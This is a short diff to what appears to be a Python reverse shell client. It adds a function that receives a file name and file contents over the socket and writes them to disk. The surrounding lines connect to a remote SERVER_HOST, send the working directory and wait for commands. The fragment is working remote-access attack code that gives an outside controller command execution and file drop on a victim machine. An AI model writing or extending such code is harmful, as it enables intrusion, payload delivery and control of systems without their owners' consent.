@@ -18,7 +18,15 @@ s.connect((SERVER_HOST, SERVER_PORT))
 
 cwd = os.getcwd()
 s.send(cwd.encode())
-
+def recvfile(client_socket, filename):
+    filename = client_socket.recv(BUFFER_SIZE).decode()
+    filename = os.path.basename(filename)
+    with open(filename, 'wb') as f:
+        while True:
+            bytes_read = client_socket.recv(BUFFER_SIZE)
+            if not bytes_read:
+                break
+            f.write(bytes_read) 
 while True:
     # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
